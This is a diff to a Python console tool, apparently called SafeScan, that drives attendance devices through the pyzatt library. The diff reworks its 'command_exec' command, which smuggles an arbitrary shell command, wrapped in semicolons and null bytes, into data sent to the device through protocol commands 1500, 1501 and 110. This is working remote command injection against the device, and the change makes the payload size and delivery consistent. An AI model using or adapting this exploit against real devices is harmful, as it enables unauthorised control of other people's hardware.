@@ -1,5 +1,6 @@
 import cmd
 import traceback
+import struct
 from pyzatt.pyzatt import pyzatt as pyzk
 from pyzatt.pyzatt.zkmodules import defs as defs
 from pyzatt.pyzatt.misc import *
@@ -74,19 +75,20 @@ class SafeScan(cmd.Cmd):
             print("[*] Usage: command_exec <cmd>\n[*] Output will not be returned, but you could write to a file and get it afterwards\n")
             return True
         try:
+            payload = ('; ' + line + '; echo \x00\x00').encode()
+
             # prepare data
-            self.z.send_command(1500, struct.pack('<II', 1, 1))
+            self.z.send_command(1500, struct.pack('<II', len(payload), len(payload)))
             self.z.recv_reply()
 
             # send data
-            self.z.send_command(1501, 'a'.encode())
+            self.z.send_command(1501, payload)
             self.z.recv_reply()
 
             # apply data
             data = bytearray()
             data.extend(struct.pack('<I', 1700))
-            payload = '; ' + line + '; echo \x00\x00'
-            data.extend(payload.encode())
+            data.extend(payload)
             self.z.send_command(110, data)
             self.z.recv_reply()
 
